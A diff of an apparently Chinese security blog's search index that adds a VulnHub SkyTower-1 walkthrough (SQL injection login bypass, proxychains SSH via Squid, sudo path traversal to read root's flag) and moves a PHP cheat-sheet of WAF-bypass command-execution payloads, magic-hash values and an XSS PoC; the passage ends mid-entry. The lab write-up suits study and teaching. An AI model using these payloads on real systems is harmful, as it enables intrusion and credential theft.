@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>SkyTower-1</title>
+      <link href="/posts/SkyTower-1/"/>
+      <url>/posts/SkyTower-1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>SkyTower-1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/skytower-1,96/">vulnhub靶场-SkyTower:1</a></p><p>目标: attack a system using a multi-faceted approach and obtain the “flag”.</p><p>提示: You will most likely find that automated tools will not assist you.</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.6</p><p>Linux: 192.168.56.101</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><ul><li>端口: 22, 80, 3128, 其中22端口有防火墙</li><li>中间件: Apache 2.2.22, Squid http proxy 3.1.20</li><li>系统: Linux 3.2-3.16</li></ul><p>目录扫描没有任何的结果, 只能是从80下手了, 80也只有一个登录框</p><p>尝试sql注入, 发现输入<code>'</code>的时候返回mysql的错误信息, 尝试注入:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;|| 1=1 #</span><br></pre></td></tr></table></figure><p>任意一个为上即可, 发现账号密码<code>john : hereisjohn</code>, 且可以得到我们必须通过那个代理(3128)才能访问22端口</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929105418874.png" alt="image-20240929105418874"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>需要代理, 请出我们的proxychains工具:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.config</span><br><span class="line"><span class="comment"># 注释掉存在的代理, 添加下面的内容</span></span><br><span class="line">http  192.168.56.101 3128</span><br><span class="line"><span class="comment"># 尝试登录, 拿到shell</span></span><br><span class="line">proxychains ssh john@192.168.56.101 -t <span class="string">&quot;/bin/sh&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>proxychains ssh john@192.168.56.101</code>不成功的原因可能是登陆之后没有创建一个shell或者被干掉了, 直接退出了</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929110341140.png" alt="image-20240929110341140"></p><p>我这里将会话转移到msf上了, 比较稳定, 就不放图了; 也可以用perl反弹shell</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><ul><li>权限: john, 无sudo权限</li><li>环境: gcc/cc/python均无</li><li>系统: Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64 GNU/Linux</li><li>用户: john, sara, william</li><li>MySQL: root root</li></ul><p>没法编译脚本, 脚本提权先放一边, 先看看还有什么漏了: 比如MySQL</p><blockquote><p>MySQL账密可以从<code>/var/www/login.php</code>得到</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use SkyTech</span><br><span class="line">show tables;</span><br><span class="line">select * from login</span><br></pre></td></tr></table></figure><p>明文存储密码; 正好对应三个用户, 试试ssh登录, sara可以登陆而william不行</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929113650905.png" alt="image-20240929113650905"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="comment"># (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/* 该目录下有root权限, 该目录在根目录下</span></span><br><span class="line">sudo <span class="built_in">ls</span> /accounts/../root</span><br><span class="line"><span class="comment"># 利用accounts的权限读取root, 有一个flag.txt</span></span><br><span class="line">sudo <span class="built_in">cat</span> /accounts/../root/flag.txt</span><br><span class="line"><span class="comment"># Congratz, have a cold one to celebrate! root password is theskytower</span></span><br><span class="line"><span class="comment"># 拿到root账密, 登录即可</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929114639882.png" alt="image-20240929114639882"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><h3 id="sql注入"><a class="header-anchor" href="#sql注入">¶</a>sql注入</h3><p>我是脚本小子, 我将告诉你用下面这个字典同时跑账号密码可以登录80端口</p><p><a href="https://github.com/melbinkm/SQL-Injection-Payloads/blob/master/sqli_auth.list">https://github.com/melbinkm/SQL-Injection-Payloads/blob/master/sqli_auth.list</a></p><h3 id="proxytunnel"><a class="header-anchor" href="#proxytunnel">¶</a>proxytunnel</h3><p>隧道代理, 可以映射到本地端口</p><p>使用条件: 防火墙禁止DNS和ICMP隧道，只允许代理服务器上网的情景</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxytunnel -p 192.168.56.101:3128 -d 127.0.0.1:22 -a 5566  </span><br><span class="line"><span class="comment"># kali本地5566端口</span></span><br><span class="line">ssh john@127.0.0.1 -p 5566</span><br><span class="line"><span class="comment"># 登录失败</span></span><br><span class="line">ssh john@127.0.0.1 -p 5566 <span class="built_in">ls</span> -a</span><br><span class="line"><span class="comment"># 输入密码后会返回ls -a的结果</span></span><br></pre></td></tr></table></figure><p>抓一下<code>.bashrc</code>, 该文件用于操作shell, 发现该文件当 <code>$-</code> 包含 <code>i</code> 时不执行任何操作，而在不包含 <code>i</code> 时退出函数, 也就是无论如何这个shell都是无用的</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> $- <span class="keyword">in</span></span><br><span class="line">    *i*) ;;</span><br><span class="line">      *) <span class="built_in">return</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>将其删除即可:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxytunnel -p 192.168.56.101:3128 -d 127.0.0.1:22 -a 5566 <span class="built_in">rm</span> .bashrc</span><br><span class="line"><span class="comment"># ssh john@127.0.0.1 -p 5566 rm .bashrc</span></span><br><span class="line">ssh john@127.0.0.1 -p 5566</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MySQL </tag>
+            
+            <tag> 提权 </tag>
+            
+            <tag> Linux </tag>
+            
+            <tag> 工具利用 </tag>
+            
+            <tag> 代理 </tag>
+            
+            <tag> shell禁用绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Stapler-1</title>
       <link href="/posts/Stapler-1/"/>
       <url>/posts/Stapler-1/</url>
@@ -380,9 +415,9 @@
             
             <tag> SQL </tag>
             
-            <tag> SQL盲注 </tag>
-            
             <tag> 工具利用 </tag>
+            
+            <tag> SQL盲注 </tag>
             
             <tag> 堆叠注入 </tag>
             
@@ -421,9 +456,9 @@
             
             <tag> SQL </tag>
             
-            <tag> SQL盲注 </tag>
-            
             <tag> 工具利用 </tag>
+            
+            <tag> SQL盲注 </tag>
             
             <tag> 堆叠注入 </tag>
             
@@ -456,9 +491,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> SQL </tag>
-            
             <tag> RCE </tag>
+            
+            <tag> SQL </tag>
             
             <tag> SQL盲注 </tag>
             
@@ -487,9 +522,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> RCE </tag>
+            
+            <tag> PHP </tag>
             
             <tag> 文件上传 </tag>
             
@@ -518,9 +553,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> RCE </tag>
+            
+            <tag> PHP </tag>
             
             <tag> 文件包含 </tag>
             
@@ -549,9 +584,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> RCE </tag>
+            
+            <tag> PHP </tag>
             
         </tags>
       
@@ -578,9 +613,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> RCE </tag>
+            
+            <tag> PHP </tag>
             
         </tags>
       
@@ -607,13 +642,13 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> RCE </tag>
             
-            <tag> 文件包含 </tag>
+            <tag> PHP </tag>
             
             <tag> 工具利用 </tag>
+            
+            <tag> 文件包含 </tag>
             
         </tags>
       
@@ -640,9 +675,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> RCE </tag>
+            
+            <tag> PHP </tag>
             
             <tag> 文件包含 </tag>
             
@@ -671,13 +706,13 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> RCE </tag>
             
-            <tag> 文件包含 </tag>
+            <tag> PHP </tag>
             
             <tag> 工具利用 </tag>
+            
+            <tag> 文件包含 </tag>
             
         </tags>
       
@@ -704,13 +739,13 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> RCE </tag>
             
-            <tag> 文件包含 </tag>
+            <tag> PHP </tag>
             
             <tag> 工具利用 </tag>
+            
+            <tag> 文件包含 </tag>
             
         </tags>
       
@@ -795,9 +830,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> RCE </tag>
+            
+            <tag> PHP </tag>
             
             <tag> 反序列化 </tag>
             
@@ -838,9 +873,9 @@
             
             <tag> Linux </tag>
             
-            <tag> 内网 </tag>
-            
             <tag> 工具利用 </tag>
+            
+            <tag> 内网 </tag>
             
             <tag> Windows </tag>
             
@@ -869,9 +904,9 @@
             
             <tag> msf </tag>
             
-            <tag> 内网 </tag>
-            
             <tag> 工具利用 </tag>
+            
+            <tag> 内网 </tag>
             
         </tags>
       
@@ -898,9 +933,9 @@
             
             <tag> 绕过 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> RCE </tag>
+            
+            <tag> PHP </tag>
             
             <tag> 隐写 </tag>
             
@@ -1305,33 +1340,6 @@
     
     
     <entry>
-      <title>PHP</title>
-      <link href="/posts/php/"/>
-      <url>/posts/php/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>&quot;换&quot;变量绕过</h1><p>当php进行解析时，如果变量名前面有空格，php会自动去掉前面的空格再进行解析</p><p>所以, 假如 waf 不允许 <code>num</code> 变量接收字母，那么使用 <code>  num</code> 就可以（前面有个空格）</p><p>同理, 当 <code>?num=phpinfo()</code> 报错，那就试试<code>? num=phpinfo()</code></p><h1>弱比较和强比较</h1><table><thead><tr><th>类型</th><th>常见</th><th>原因</th></tr></thead><tbody><tr><td>弱比较</td><td>==, !=</td><td>在比较时会把两边转化为同一类型然后比较值是否相等<br />比较一个数字和字符串或者比较涉及到数字内容的字符串，会被转换成数值并且比较按照数值来进行,舍弃字母</td></tr><tr><td>强比较</td><td>===</td><td>等号两边类型和值必须都相等，否则返回&quot;false&quot;</td></tr></tbody></table><blockquote><p>数值转化规则：在转化时，PHP会从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符（不包含小数点, e, E）</p><p>在遇到e、E时，会按科学计数法处理</p></blockquote><h1>常见过滤绕过</h1><p>部分字符被绕过可以用ascii码进行转换绕过(方法不止一种)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">对目录进行扫描</span><br><span class="line">?num=var_dump(scandir(chr(47)))</span><br><span class="line"></span><br><span class="line">字符串全变</span><br><span class="line">? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a class="header-anchor" href="#命令执行">¶</a>命令执行</h2><p>过滤了system，那我们换成 passthru, echo, eval 等</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">利用 php 的 echo：</span><br><span class="line">?c=”echo `tac config.php`;&quot;</span><br><span class="line">echo file_get_contents(‘config.php’);</span><br><span class="line"></span><br><span class="line">利用其他函数同上:</span><br><span class="line">?c=passthru(‘cat config.php’);</span><br><span class="line">?c=passthru(‘config.php’);</span><br><span class="line">?c=show_source(“config.php”);</span><br><span class="line"></span><br><span class="line">利用php伪协议读取文件：</span><br><span class="line">?c=include(&quot;php://filter/convert.base64-encode/resource=config.php&quot;);</span><br><span class="line"></span><br><span class="line">字符串拼接：?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;cat config.php&#x27;);</span><br><span class="line"></span><br><span class="line">字符串取反构造</span><br><span class="line">?c=(~%8C%86%8C%8B%9A%92)(&#x27;ls&#x27;);</span><br><span class="line">?c=(~%8C%86%8C%8B%9A%92)(&#x27;cat config.php&#x27;);</span><br></pre></td></tr></table></figure><p>这个是system取反得到的，脚本实现方法是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=~(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是passthru：其中?&gt;闭合前面的php语句,阻断后面的语句继续执行<code>passthru(‘tac \</code>ls`’);?&gt;`</p><p>一些隔断：<code>?c=passthru('tac confi\*\*\*hp');</code><code>?c=passthru('tac confi/hp');</code></p><p>模糊匹配：当当前路径下只有一个c开头的config.php文件，<code>passthru('tac c*')?&gt;</code></p><p>前面是语句，后面是恶意代码, 这样就可以自动取得a并且执行了<code>?c= include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=config.php</code></p><p>或者用hackbar, 然后POST中输入a=cat config.php</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?c=echo `$_POST[a]`;</span><br></pre></td></tr></table></figure><h2 id="md5-string-raw"><a class="header-anchor" href="#md5-string-raw">¶</a>md5(string,raw)</h2><h3 id="弱比较"><a class="header-anchor" href="#弱比较">¶</a>弱比较</h3><p>用数组和0e方法绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">byGcY</span><br><span class="line">0e591948146966052067035298880982</span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br></pre></td></tr></table></figure><h3 id="两次MD5"><a class="header-anchor" href="#两次MD5">¶</a>两次MD5</h3><p>这个一般都是弱比较, 也有两次md5加密后还是0e开头的</p><table><thead><tr><th style="text-align:left">原字符串</th><th>一次MD5</th><th>两次MD5</th></tr></thead><tbody><tr><td style="text-align:left">CbDLytmyGm2xQyaLNhWn</td><td>0ec20b7c66cafbcc7d8e8481f0653d18</td><td>0e3a5f2a80db371d4610b8f940d296af</td></tr><tr><td style="text-align:left">770hQgrBOjrcqftrlaZk</td><td>0e689b4f703bdc753be7e27b45cb3625</td><td>0e2756da68ef740fd8f5a5c26cc45064</td></tr><tr><td style="text-align:left">7r4lGXCH2Ksu2JNT3BYM</td><td>0e269ab12da27d79a6626d91f34ae849</td><td>0e48d320b2a97ab295f5c4694759889f</td></tr></tbody></table><h3 id="强比较"><a class="header-anchor" href="#强比较">¶</a>强比较</h3><p>依然是数组绕过, 当数组绕过不成立, 就用工具构造md5碰撞</p><h2 id="intval-绕过"><a class="header-anchor" href="#intval-绕过">¶</a>intval()绕过:</h2><p>PHP_5 和PHP_7 的 intval() 规则不一样</p><p>PHP_5中，intval() 会按照数值转化规则（从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符), 很多能用的漏洞都要求php版本正确</p><ul><li>运算</li><li>URL编码</li><li>ASCII编码</li><li>SQL注入</li><li>Power函数</li><li>取反</li><li>引号包裹</li><li>内联注释</li></ul><h3 id="Intval-id-num"><a class="header-anchor" href="#Intval-id-num">¶</a>Intval($id)&gt;num</h3><ul><li>单引号绕过：’1000’</li><li>计算绕过：500/0.5</li><li>函数绕过：power(10,3)</li><li>连接符绕过：?id=100||id=1000</li><li>取反两次绕过：id=~~1000</li><li>二进制绕过：0b1111101000</li><li>其他：?id=/**/1000</li></ul><h1>php内置类</h1><h2 id="Error-Exception进行XSS-绕过Hash比较"><a class="header-anchor" href="#Error-Exception进行XSS-绕过Hash比较">¶</a>Error, Exception进行XSS, 绕过Hash比较</h2><h3 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h3><p>需要有报错的情况Error: 适用于 PHP 7Exception: 适用于PHP 5和7</p><h3 id="XSS"><a class="header-anchor" href="#XSS">¶</a>XSS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">// 测试代码</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//poc</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的话会弹出窗口显示<code>xss</code></p><h3 id="Hash绕过"><a class="header-anchor" href="#Hash绕过">¶</a>Hash绕过</h3><p>这两个异常对象是不同的（异常代码不同）但<code>__toString()</code>方法的输出的结果一模一样**<em>__toString 返回的数据包含当前行号**</em>所以要在同一行写该类调用</p><p>例题: <a href="https://so.csdn.net/so/search?q=%5B2020%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5DGreatphp&amp;t=&amp;u=&amp;urw=">[2020 极客大挑战]Greatphp</a></p><h2 id="内置类读目录-文件"><a class="header-anchor" href="#内置类读目录-文件">¶</a>内置类读目录, 文件</h2><ul><li>Directorylterator (PHP 5, PHP 7, PHP 8)DirectoryIterator与glob://协议结合可以进行目录读取, 显示出当前目录下的文件信息</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取到根目录的文件</span></span><br><span class="line"><span class="built_in">DirectoryIterator</span>(glob:<span class="comment">///*);</span></span><br></pre></td></tr></table></figure><ul><li>FilesystemIterator (PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)FilesystemIterator继承自DirectoryIterator,基本是一样的语法, 但这个类会以绝对路径形式展现</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 root 下文件</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span>(glob:<span class="comment">///root/*);</span></span><br></pre></td></tr></table></figure><ul><li>Globlterator (PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)和上面两个差不多, 以绝对路径形式展现, 可以通过模式匹配来寻找文件路径</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 bin 下的文件</span></span><br><span class="line"><span class="title function_ invoke__">Globlterator</span>(/bin<span class="comment">/*);</span></span><br></pre></td></tr></table></figure><ul><li>SplFileObject (PHP 5 &gt;= 5.1.0, PHP 7, PHP 8)读取文件内容</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 /etc/passwd 文件内容</span></span><br><span class="line"><span class="built_in">SplFileObject</span>(/etc/passwd);</span><br></pre></td></tr></table></figure><h2 id="SimpleXMLElement-XXE"><a class="header-anchor" href="#SimpleXMLElement-XXE">¶</a>SimpleXMLElement - XXE</h2><p>远程包含xml文件</p><h2 id="SoapClient-SSRF"><a class="header-anchor" href="#SoapClient-SSRF">¶</a>SoapClient - SSRF</h2><p>适用于 PHP 5、PHP 7、PHP 8, 只局限于http、https协议</p><h2 id="ReflectionMethod-获取注释内容"><a class="header-anchor" href="#ReflectionMethod-获取注释内容">¶</a>ReflectionMethod - 获取注释内容</h2><p>适用于 PHP 5 &gt;= 5.1.0, PHP 7, PHP 8<code>ReflectionFunction</code> 类的 <code>getDocComment()</code> 方法可以获取注释内容</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> web知识 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 绕过 </tag>
-            
-            <tag> PHP </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>RCE</title>
       <link href="/posts/rce/"/>
       <url>/posts/rce/</url>
@@ -1351,6 +1359,33 @@
             <tag> 绕过 </tag>
             
             <tag> RCE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>PHP</title>
+      <link href="/posts/php/"/>
+      <url>/posts/php/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>&quot;换&quot;变量绕过</h1><p>当php进行解析时，如果变量名前面有空格，php会自动去掉前面的空格再进行解析</p><p>所以, 假如 waf 不允许 <code>num</code> 变量接收字母，那么使用 <code>  num</code> 就可以（前面有个空格）</p><p>同理, 当 <code>?num=phpinfo()</code> 报错，那就试试<code>? num=phpinfo()</code></p><h1>弱比较和强比较</h1><table><thead><tr><th>类型</th><th>常见</th><th>原因</th></tr></thead><tbody><tr><td>弱比较</td><td>==, !=</td><td>在比较时会把两边转化为同一类型然后比较值是否相等<br />比较一个数字和字符串或者比较涉及到数字内容的字符串，会被转换成数值并且比较按照数值来进行,舍弃字母</td></tr><tr><td>强比较</td><td>===</td><td>等号两边类型和值必须都相等，否则返回&quot;false&quot;</td></tr></tbody></table><blockquote><p>数值转化规则：在转化时，PHP会从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符（不包含小数点, e, E）</p><p>在遇到e、E时，会按科学计数法处理</p></blockquote><h1>常见过滤绕过</h1><p>部分字符被绕过可以用ascii码进行转换绕过(方法不止一种)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">对目录进行扫描</span><br><span class="line">?num=var_dump(scandir(chr(47)))</span><br><span class="line"></span><br><span class="line">字符串全变</span><br><span class="line">? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a class="header-anchor" href="#命令执行">¶</a>命令执行</h2><p>过滤了system，那我们换成 passthru, echo, eval 等</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">利用 php 的 echo：</span><br><span class="line">?c=”echo `tac config.php`;&quot;</span><br><span class="line">echo file_get_contents(‘config.php’);</span><br><span class="line"></span><br><span class="line">利用其他函数同上:</span><br><span class="line">?c=passthru(‘cat config.php’);</span><br><span class="line">?c=passthru(‘config.php’);</span><br><span class="line">?c=show_source(“config.php”);</span><br><span class="line"></span><br><span class="line">利用php伪协议读取文件：</span><br><span class="line">?c=include(&quot;php://filter/convert.base64-encode/resource=config.php&quot;);</span><br><span class="line"></span><br><span class="line">字符串拼接：?c=$a=&#x27;sys&#x27;;$b=&#x27;tem&#x27;;$d=$a.$b;$d(&#x27;cat config.php&#x27;);</span><br><span class="line"></span><br><span class="line">字符串取反构造</span><br><span class="line">?c=(~%8C%86%8C%8B%9A%92)(&#x27;ls&#x27;);</span><br><span class="line">?c=(~%8C%86%8C%8B%9A%92)(&#x27;cat config.php&#x27;);</span><br></pre></td></tr></table></figure><p>这个是system取反得到的，脚本实现方法是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=~(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是passthru：其中?&gt;闭合前面的php语句,阻断后面的语句继续执行<code>passthru(‘tac \</code>ls`’);?&gt;`</p><p>一些隔断：<code>?c=passthru('tac confi\*\*\*hp');</code><code>?c=passthru('tac confi/hp');</code></p><p>模糊匹配：当当前路径下只有一个c开头的config.php文件，<code>passthru('tac c*')?&gt;</code></p><p>前面是语句，后面是恶意代码, 这样就可以自动取得a并且执行了<code>?c= include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=config.php</code></p><p>或者用hackbar, 然后POST中输入a=cat config.php</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?c=echo `$_POST[a]`;</span><br></pre></td></tr></table></figure><h2 id="md5-string-raw"><a class="header-anchor" href="#md5-string-raw">¶</a>md5(string,raw)</h2><h3 id="弱比较"><a class="header-anchor" href="#弱比较">¶</a>弱比较</h3><p>用数组和0e方法绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">byGcY</span><br><span class="line">0e591948146966052067035298880982</span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br></pre></td></tr></table></figure><h3 id="两次MD5"><a class="header-anchor" href="#两次MD5">¶</a>两次MD5</h3><p>这个一般都是弱比较, 也有两次md5加密后还是0e开头的</p><table><thead><tr><th style="text-align:left">原字符串</th><th>一次MD5</th><th>两次MD5</th></tr></thead><tbody><tr><td style="text-align:left">CbDLytmyGm2xQyaLNhWn</td><td>0ec20b7c66cafbcc7d8e8481f0653d18</td><td>0e3a5f2a80db371d4610b8f940d296af</td></tr><tr><td style="text-align:left">770hQgrBOjrcqftrlaZk</td><td>0e689b4f703bdc753be7e27b45cb3625</td><td>0e2756da68ef740fd8f5a5c26cc45064</td></tr><tr><td style="text-align:left">7r4lGXCH2Ksu2JNT3BYM</td><td>0e269ab12da27d79a6626d91f34ae849</td><td>0e48d320b2a97ab295f5c4694759889f</td></tr></tbody></table><h3 id="强比较"><a class="header-anchor" href="#强比较">¶</a>强比较</h3><p>依然是数组绕过, 当数组绕过不成立, 就用工具构造md5碰撞</p><h2 id="intval-绕过"><a class="header-anchor" href="#intval-绕过">¶</a>intval()绕过:</h2><p>PHP_5 和PHP_7 的 intval() 规则不一样</p><p>PHP_5中，intval() 会按照数值转化规则（从头开始挨个读取数据，在获取到整数时保留，当读取到第一个非数字时，舍弃包括该位之后的全部字符), 很多能用的漏洞都要求php版本正确</p><ul><li>运算</li><li>URL编码</li><li>ASCII编码</li><li>SQL注入</li><li>Power函数</li><li>取反</li><li>引号包裹</li><li>内联注释</li></ul><h3 id="Intval-id-num"><a class="header-anchor" href="#Intval-id-num">¶</a>Intval($id)&gt;num</h3><ul><li>单引号绕过：’1000’</li><li>计算绕过：500/0.5</li><li>函数绕过：power(10,3)</li><li>连接符绕过：?id=100||id=1000</li><li>取反两次绕过：id=~~1000</li><li>二进制绕过：0b1111101000</li><li>其他：?id=/**/1000</li></ul><h1>php内置类</h1><h2 id="Error-Exception进行XSS-绕过Hash比较"><a class="header-anchor" href="#Error-Exception进行XSS-绕过Hash比较">¶</a>Error, Exception进行XSS, 绕过Hash比较</h2><h3 id="条件"><a class="header-anchor" href="#条件">¶</a>条件</h3><p>需要有报错的情况Error: 适用于 PHP 7Exception: 适用于PHP 5和7</p><h3 id="XSS"><a class="header-anchor" href="#XSS">¶</a>XSS</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">// 测试代码</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//poc</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入的话会弹出窗口显示<code>xss</code></p><h3 id="Hash绕过"><a class="header-anchor" 